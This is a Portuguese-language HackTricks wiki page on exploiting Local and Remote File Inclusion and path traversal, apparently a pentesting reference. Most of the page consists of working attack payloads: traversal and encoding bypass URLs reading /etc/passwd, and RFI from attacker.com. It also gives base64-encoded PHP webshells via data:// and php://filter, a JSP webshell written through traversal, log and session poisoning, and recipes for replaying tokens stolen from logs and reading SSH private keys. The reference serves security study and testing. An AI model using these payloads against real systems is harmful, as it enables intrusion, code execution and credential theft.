# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** O arquivo é carregado de um servidor remoto (Melhor: você pode escrever o código e o servidor irá executá-lo). No php isso está **desativado** por padrão (**allow_url_include**).\
**Local File Inclusion (LFI):** O servidor carrega um arquivo local.

A vulnerabilidade ocorre quando o usuário pode controlar, de alguma forma, o arquivo que será carregado pelo servidor.

Funções **PHP** vulneráveis: require, require_once, include, include_once

Uma ferramenta interessante para explorar essa vulnerabilidade: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interessantes - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Misturando várias listas *nix de LFI e adicionando mais caminhos, criei esta:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Tente também trocar `/` por `\`\
Tente também adicionar `../../../../../`

Uma lista que usa várias técnicas para encontrar o arquivo /etc/password (para verificar se a vulnerabilidade existe) pode ser encontrada [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Mescla de diferentes wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Tente também trocar `/` por `\`\
Tente também remover `C:/` e adicionar `../../../../../`

Uma lista que usa várias técnicas para encontrar o arquivo /boot.ini (para verificar se a vulnerabilidade existe) pode ser encontrada [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Confira a lista LFI do linux.

## Básico LFI and bypasses

All the examples are for Local File Inclusion but could be applied to Remote File Inclusion also (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)//>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences removidos de forma não recursiva
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Contornar a adição de caracteres no final da string fornecida (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Isto está **resolvido desde o PHP 5.4**

### **Codificação**

Você pode usar codificações não padrão como double URL encode (e outras):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### A partir de um diretório existente

Talvez o back-end esteja verificando o caminho da pasta:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Explorando diretórios do sistema de arquivos em um servidor

O sistema de arquivos de um servidor pode ser explorado recursivamente para identificar diretórios, não apenas arquivos, empregando certas técnicas. Esse processo envolve determinar a profundidade do diretório e sondar a existência de pastas específicas. Abaixo está um método detalhado para conseguir isso:

1. **Determinar a profundidade do diretório:** Determine a profundidade do seu diretório atual obtendo com sucesso o arquivo `/etc/passwd` (aplicável se o servidor for baseado em Linux). Um URL de exemplo pode ser estruturado da seguinte forma, indicando uma profundidade de três:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Probe for Folders:** Anexe o nome da pasta suspeita (por exemplo, `private`) ao URL e, em seguida, navegue de volta para `/etc/passwd`. O nível de diretório adicional exige aumentar a profundidade em 1:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interprete os resultados:** A resposta do servidor indica se o diretório existe:
- **Erro / Sem saída:** O diretório `private` provavelmente não existe no local especificado.
- **Conteúdo de `/etc/passwd`:** A presença do diretório `private` é confirmada.
4. **Exploração Recursiva:** Diretórios descobertos podem ser sondados para subdiretórios ou arquivos usando a mesma técnica ou métodos tradicionais de Local File Inclusion (LFI).

Para explorar diretórios em diferentes localizações do sistema de arquivos, ajuste o payload de acordo. Por exemplo, para verificar se `/var/www/` contém um diretório `private` (assumindo que o diretório atual está em uma profundidade de 3), use:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation é um método empregado para manipular caminhos de arquivo em aplicações web. Frequentemente é usado para acessar arquivos restritos contornando certas medidas de segurança que acrescentam caracteres adicionais ao final dos caminhos. O objetivo é construir um caminho de arquivo que, uma vez alterado pela medida de segurança, ainda aponte para o arquivo desejado.

In PHP, várias representações de um caminho de arquivo podem ser consideradas equivalentes devido à natureza do sistema de arquivos. Por exemplo:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` e `/etc/passwd/` são todos tratados como o mesmo caminho.
- Quando os últimos 6 caracteres são `passwd`, anexar uma `/` (tornando `passwd/`) não altera o arquivo alvo.
- Da mesma forma, se `.php` for anexado a um caminho de arquivo (como `shellcode.php`), adicionar `/.` no final não altera o arquivo acessado.

Os exemplos fornecidos demonstram como utilizar path truncation para acessar `/etc/passwd`, um alvo comum devido ao seu conteúdo sensível (informações de contas de usuário):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Nesses cenários, o número de travessias necessárias pode ser cerca de 2027, mas esse número pode variar com base na configuração do servidor.

- **Using Dot Segments and Additional Characters**: Sequências de travessia (`../`) combinadas com segmentos adicionais de ponto e caracteres podem ser usadas para navegar pelo sistema de arquivos, efetivamente ignorando strings anexadas pelo servidor.
- **Determining the Required Number of Traversals**: Por tentativa e erro, é possível encontrar o número preciso de sequências `../` necessárias para navegar até o diretório raiz e, em seguida, para `/etc/passwd`, garantindo que quaisquer strings anexadas (como `.php`) sejam neutralizadas, mas o caminho desejado (`/etc/passwd`) permaneça intacto.
- **Starting with a Fake Directory**: É prática comum começar o caminho com um diretório inexistente (como `a/`). Essa técnica é usada como medida de precaução ou para satisfazer os requisitos da lógica de interpretação de caminhos do servidor.

When employing path truncation techniques, é crucial entender como o servidor interpreta caminhos e a estrutura do sistema de arquivos. Cada cenário pode requerer uma abordagem diferente, e testes são frequentemente necessários para encontrar o método mais eficaz.

**This vulnerability was corrected in PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

No php isso está desabilitado por padrão porque **`allow_url_include`** está **Off.** Deve estar **On** para funcionar, e nesse caso você poderia incluir um arquivo PHP do seu servidor e obter RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Se por algum motivo **`allow_url_include`** está **On**, mas o PHP está **filtrando** o acesso a páginas externas, [de acordo com este post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), você pode usar, por exemplo, o data protocol com base64 para decodificar um código PHP b64 e obter RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> No código anterior, o final `+.txt` foi adicionado porque o atacante precisava de uma string que terminasse em `.txt`, então a string termina com isso e, após a decodificação b64, essa parte retornará apenas lixo e o código PHP real será incluído (e, portanto, executado).

Outro exemplo **não usando o protocolo `php://`** seria:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Elemento root em Python

Em Python, em um código como este:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Se o usuário passar um **absolute path** para **`file_name`**, o **previous path** é simplesmente removido:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
It is the intended behaviour according to [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Se um componente for um caminho absoluto, todos os componentes anteriores são descartados e a junção continua a partir do componente de caminho absoluto.

## Java Listagem de diretórios

Parece que se você tiver um Path Traversal em Java e você **pedir um diretório** em vez de um arquivo, uma **listagem do diretório é retornada**. Isso não acontecerá em outras linguagens (até onde sei).

## Top 25 parâmetros

Aqui está a lista dos top 25 parâmetros que podem estar vulneráveis a local file inclusion (LFI) (a partir de [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI usando PHP wrappers & protocols

### php://filter

Os filtros do PHP permitem realizar operações básicas de **modificação nos dados** antes de serem lidos ou gravados. Existem 5 categorias de filtros:

- [Filtros de string](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Remove tags dos dados (tudo entre os caracteres "<" e ">")
- Observe que este filtro desapareceu nas versões mais recentes do PHP
- [Filtros de conversão](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Transforma para uma codificação diferente (`convert.iconv.<input_enc>.<output_enc>`). Para obter a **lista de todas as codificações** suportadas execute no console: `iconv -l`

> [!WARNING]
> Abusando do filtro de conversão `convert.iconv.*` você pode **gerar texto arbitrário**, o que pode ser útil para escrever texto arbitrário ou fazer com que uma função como include processe texto arbitrário. Para mais informações veja [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Filtros de compressão](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Comprime o conteúdo (útil se exfiltrando muita informação)
- `zlib.inflate`: Descomprime os dados
- [Filtros de criptografia](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Deprecated
- `mdecrypt.*` : Deprecated
- Outros filtros
- Ao executar em PHP `var_dump(stream_get_filters());` você pode encontrar alguns **filtros inesperados**:
- `consumed`
- `dechunk`: reverte a codificação chunked do HTTP
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> A parte "php://filter" é insensível a maiúsculas e minúsculas

### Usando php filters como oracle para ler arquivos arbitrários

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) é proposta uma técnica para ler um arquivo local sem que a saída seja retornada pelo servidor. Esta técnica baseia-se numa **boolean exfiltration of the file (char by char) usando php filters** como oracle. Isso acontece porque php filters podem ser usados para tornar um texto grande o suficiente para fazer o php lançar uma exception.

No post original você encontra uma explicação detalhada da técnica, mas aqui vai um resumo rápido:

- Use o codec **`UCS-4LE`** para deixar o caractere inicial do texto no começo e fazer o tamanho da string aumentar exponencialmente.
- Isso será usado para gerar um **texto tão grande quando a letra inicial for adivinhada corretamente** que o php acionará um **erro**
- O filtro **dechunk** irá **remover tudo se o primeiro char não for hexadecimal**, então podemos saber se o primeiro char é hex.
- Isso, combinado com o anterior (e outros filters dependendo da letra adivinhada), permitirá que adivinhemos uma letra no início do texto observando quando fazemos transformações suficientes para que ela deixe de ser um carácter hexadecimal. Porque se for hexadecimal, dechunk não a apagará e a bomba inicial fará o php gerar um erro.
- O codec **convert.iconv.UNICODE.CP930** transforma cada letra na seguinte (então após este codec: a -> b). Isso nos permite descobrir se a primeira letra é um `a`, por exemplo, porque se aplicarmos 6 vezes este codec a->b->c->d->e->f->g a letra deixa de ser um carácter hexadecimal, portanto dechunk não a apaga e o erro do php é disparado porque ele se multiplica com a bomba inicial.
- Usando outras transformações como **rot13** no início é possível leak other chars como n, o, p, q, r (e outros codecs podem ser usados para mover outras letras para a faixa hex).
- Quando o char inicial é um número é necessário fazer base64 encode e leak as 2 primeiras letras para leak o número.
- O problema final é ver **how to leak more than the initial letter**. Usando order memory filters como **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** é possível trocar a ordem dos chars e colocar em primeiro posição outras letras do texto.
- E para poder obter **further data** a ideia é **gerar 2 bytes de junk data no início** com **convert.iconv.UTF16.UTF16**, aplicar **UCS-4LE** para fazer **pivot with the next 2 bytes**, e d**eletar os dados até os dados lixo** (isso removerá os primeiros 2 bytes do texto inicial). Continue fazendo isso até atingir o bit desejado para leak.

No post também foi divulgada uma ferramenta para realizar isso automaticamente: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Este wrapper permite acessar file descriptors que o processo tem abertos. Potencialmente útil para exfiltrate o conteúdo de arquivos abertos:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Você também pode usar **php://stdin, php://stdout and php://stderr** para acessar os **descritores de arquivo 0, 1 e 2** respectivamente (não tenho certeza de como isso poderia ser útil em um ataque)

### zip:// and rar://

Faça upload de um arquivo Zip ou Rar com um PHPShell dentro e acesse-o.\
Para poder abusar do protocolo rar, ele **precisa ser especificamente ativado**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Note que este protocolo é restrito pelas configurações do PHP **`allow_url_open`** e **`allow_url_include`**

### expect://

Expect precisa estar ativado. Você pode executar código usando isto:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Especifique seu payload nos parâmetros POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Um arquivo `.phar` pode ser utilizado para executar código PHP quando uma aplicação web utiliza funções como `include` para carregar arquivos. O trecho de código PHP abaixo demonstra a criação de um arquivo `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Para compilar o arquivo `.phar`, o seguinte comando deve ser executado:
```bash
php --define phar.readonly=0 create_path.php
```
Ao ser executado, um arquivo chamado `test.phar` será criado, o qual pode potencialmente ser usado para explorar vulnerabilidades de Local File Inclusion (LFI).

Nos casos em que o LFI apenas realiza a leitura de arquivos sem executar o código PHP contido neles, através de funções como `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()` ou `filesize()`, pode-se tentar explorar uma vulnerabilidade de deserialização. Essa vulnerabilidade está associada à leitura de arquivos usando o protocolo `phar`.

Para uma compreensão detalhada sobre a exploração de vulnerabilidades de deserialização no contexto de arquivos `.phar`, consulte o documento vinculado abaixo:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Foi possível abusar de **any arbitrary file read from PHP that supports php filters** para obter um RCE. The detailed description can be [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Resumo muito rápido: um **3 byte overflow** no heap do PHP foi abusado para **alterar a cadeia de free chunks** de um tamanho específico para poder **escrever qualquer coisa em qualquer endereço**, então um hook foi adicionado para chamar **`system`**.\
Foi possível alocar chunks de tamanhos específicos abusando de mais php filters.

### Mais protocolos

Confira mais possíveis[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Escreve em memória ou em um arquivo temporário (não tenho certeza de como isso pode ser útil em um ataque de file inclusion)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Acessando o sistema de arquivos local
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Acessando URLs HTTP(s)
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Acessando URLs FTP(s)
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Fluxos de compressão
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Encontrar nomes de caminho que correspondem ao padrão (Não retorna nada imprimível, então não é realmente útil aqui)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Streams de áudio (Não útil para ler arquivos arbitrários)

## LFI via PHP's 'assert'

Os riscos de Local File Inclusion (LFI) em PHP são notavelmente altos ao lidar com a função 'assert', que pode executar código contido em strings. Isso é particularmente problemático se a entrada contendo caracteres de directory traversal como ".." estiver sendo verificada, mas não for devidamente higienizada.

Por exemplo, o código PHP pode ser projetado para prevenir directory traversal da seguinte forma:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Embora isso vise impedir traversal, cria inadvertidamente um vetor para code injection. Para explorar isso e ler o conteúdo de arquivos, um atacante poderia usar:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Da mesma forma, para executar comandos arbitrários do sistema, pode-se usar:
```plaintext
' and die(system("id")) or '
```
É importante **URL-encode estas payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Esta técnica é relevante em casos onde você **controla** o **file path** de uma **PHP function** que vai **access a file** mas você não verá o conteúdo do arquivo (como uma chamada simples a **`file()`**) apesar do conteúdo não ser mostrado.

Em [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) é explicado como um blind path traversal pode ser abusado via PHP filter para **exfiltrate the content of a file via an error oracle**.

Em resumo, a técnica usa a codificação **"UCS-4LE"** para tornar o conteúdo de um arquivo tão **grande** que a **PHP function** que abre o arquivo irá disparar um **erro**.

Depois, para leak do primeiro char, o filtro **`dechunk`** é usado junto com outros como **base64** ou **rot13** e, finalmente, os filtros **convert.iconv.UCS-4.UCS-4LE** e **convert.iconv.UTF16.UTF-16BE** são usados para **place other chars at the beggining and leak them**.

**Funções que podem ser vulneráveis**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Para detalhes técnicos, confira o post mencionado!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Quando código server-side que ingests/uploads files constrói o caminho de destino usando dados controlados pelo usuário (por exemplo, um filename ou URL) sem canonicalising e validar, segmentos `..` e caminhos absolutos podem escapar do diretório pretendido e causar uma gravação arbitrária de arquivo. Se você puder colocar o payload sob um web-exposed directory, normalmente obtém RCE não autenticado ao dropar um webshell.

Fluxo típico de exploração:
- Identifique um write primitive em um endpoint ou background worker que aceita um path/filename e escreve conteúdo no disco (p.ex., message-driven ingestion, XML/JSON command handlers, ZIP extractors, etc.).
- Determine web-exposed directories. Exemplos comuns:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Crie um traversal path que quebre para fora do diretório de armazenamento pretendido até a webroot, e inclua o conteúdo do seu webshell.
- Acesse o payload dropado e execute comandos.

Notas:
- O serviço vulnerável que realiza a gravação pode escutar em uma porta não-HTTP (por exemplo, um JMF XML listener em TCP 4004). O portal web principal (porta diferente) servirá seu payload depois.
- Em stacks Java, essas gravações de arquivo são frequentemente implementadas com simples concatenação `File`/`Paths`. Falta de canonicalisation/allow-listing é a falha central.

Exemplo genérico estilo XML/JMF (os esquemas do produto variam – o wrapper DOCTYPE/body é irrelevante para o traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Mitigações que impedem essa classe de bugs:
- Resolva para um caminho canônico e assegure que ele é descendente de um diretório base permitido.
- Rejeite qualquer caminho contendo `..`, caminhos absolutos, ou letras de unidade; prefira nomes de arquivo gerados.
- Execute o writer como uma conta com poucos privilégios e segrege os diretórios de escrita das raízes servidas.

## Remote File Inclusion

Explained previously, [**follow this link**](#remote-file-inclusion).

### Via arquivo de log Apache/Nginx

If the Apache or Nginx server is **vulnerable to LFI** inside the include function you could try to access to **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, set inside the **user agent** or inside a **GET parameter** a php shell like **`<?php system($_GET['c']); ?>`** and include that file

> [!WARNING]
> Observe que **se você usar aspas duplas** para o shell em vez de **aspas simples**, as aspas duplas serão modificadas para a string "_**quote;**_", **PHP gerará um erro** ali e **nada mais será executado**.
> 
> Além disso, certifique-se de **write correctly the payload** ou o PHP dará erro toda vez que tentar carregar o arquivo de log e você não terá uma segunda oportunidade.

Isso também pode ser feito em outros logs, mas **atenção,** o código dentro dos logs pode estar URL encoded e isso pode destruir o Shell. O cabeçalho **authorisation "basic"** contém "user:password" em Base64 e isso é decodificado nos logs. O PHPShell pode ser inserido dentro desse cabeçalho.\ 
Outros possíveis caminhos de logs:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Leia os logs de acesso para coletar auth tokens baseados em GET (token replay)

Muitas apps aceitam por engano session/auth tokens via GET (por exemplo, AuthenticationToken, token, sid). Se você tem uma primitiva de path traversal/LFI para os logs do servidor web, você pode roubar esses tokens dos logs de acesso e replayá-los para contornar completamente a autenticação.

How-to:
- Use the traversal/LFI to read the web server access log. Common locations:
- /var/log/apache2/access.log, /var/log/httpd/access_log
- /var/log/nginx/access.log
- Some endpoints return file reads Base64-encoded. If so, decode locally and inspect the log lines.
- Use grep para buscar requisições GET que incluem um parâmetro token e capture seu valor, então faça replay contra o ponto de entrada da aplicação.

Example flow (generic):
```http
GET /vuln/asset?name=..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log HTTP/1.1
Host: target
```
Decodifique o body se estiver em Base64, depois reproduza um token capturado:
```http
GET /portalhome/?AuthenticationToken=<stolen_token> HTTP/1.1
Host: target
```
Notas:
- Tokens em URLs são registrados por padrão; nunca aceite bearer tokens via GET em sistemas de produção.
- Se o app suporta múltiplos nomes de token, procure por chaves comuns como AuthenticationToken, token, sid, access_token.
- Rotacione quaisquer tokens que possam ter leaked para os logs.

### Via Email

**Envie um e-mail** para uma conta interna (user@localhost) contendo seu payload PHP como `<?php echo system($_REQUEST["cmd"]); ?>` e tente incluí-lo no arquivo de e-mail do usuário com um caminho como **`/var/mail/<USERNAME>`** ou **`/var/spool/mail/<USERNAME>`**

### Via /proc/\*/fd/\*

1. Faça upload de muitas shells (por exemplo: 100)
2. Inclua [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), com $PID = PID do processo (pode ser brute forced) e $FD o file descriptor (também pode ser brute forced)

### Via /proc/self/environ

Como um arquivo de log, envie o payload no User-Agent; ele será refletido dentro do arquivo /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via upload

Se você puder fazer upload de um arquivo, basta injetar o shell payload nele (ex: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Para manter o arquivo legível é melhor injetar nos metadados das imagens/doc/pdf

### Via upload de arquivo ZIP

Envie um arquivo ZIP contendo um PHP shell comprimido e acesse:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Via PHP sessions

Verifique se o site usa PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
No PHP, essas sessões são armazenadas em arquivos _/var/lib/php5/sess\\_\[PHPSESSID]\_
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Defina o cookie para `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Use o LFI para incluir o arquivo de sessão do PHP
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Via ssh

Se o ssh estiver ativo, verifique qual usuário está sendo usado (/proc/self/status & /etc/passwd) e tente acessar **\<HOME>/.ssh/id_rsa**

### **Via** **vsftpd** _**logs**_

Os logs do servidor FTP vsftpd estão localizados em _**/var/log/vsftpd.log**_. No cenário em que exista uma vulnerabilidade Local File Inclusion (LFI), e seja possível acessar um servidor vsftpd exposto, os seguintes passos podem ser considerados:

1. Injete um payload PHP no campo username durante o processo de login.
2. Após a injeção, utilize a LFI para recuperar os logs do servidor em _**/var/log/vsftpd.log**_.

### Via php base64 filter (using base64)

Como mostrado em [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, PHP base64 filter just ignore Non-base64. Você pode usar isso para contornar a verificação de extensão de arquivo: se você fornecer base64 que termina com ".php", ele simplesmente ignora o "." e anexa "php" ao base64. Aqui está um exemplo de payload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Via php filters (sem necessidade de arquivo)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) explica que você pode usar **php filters to generate arbitrary content** como saída. O que basicamente significa que você pode **gerar código php arbitrário** para o include **sem precisar escrevê-lo** em um arquivo.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Via segmentation fault

**Upload** um arquivo que será armazenado como **temporário** em `/tmp`, então na **mesma request,** provoque um **segmentation fault**, e então o **arquivo temporário não será deletado** e você pode procurá-lo.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Via Nginx temp file storage

Se você encontrou um **Local File Inclusion** e **Nginx** está rodando na frente do PHP, você pode ser capaz de obter RCE com a seguinte técnica:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Via PHP_SESSION_UPLOAD_PROGRESS

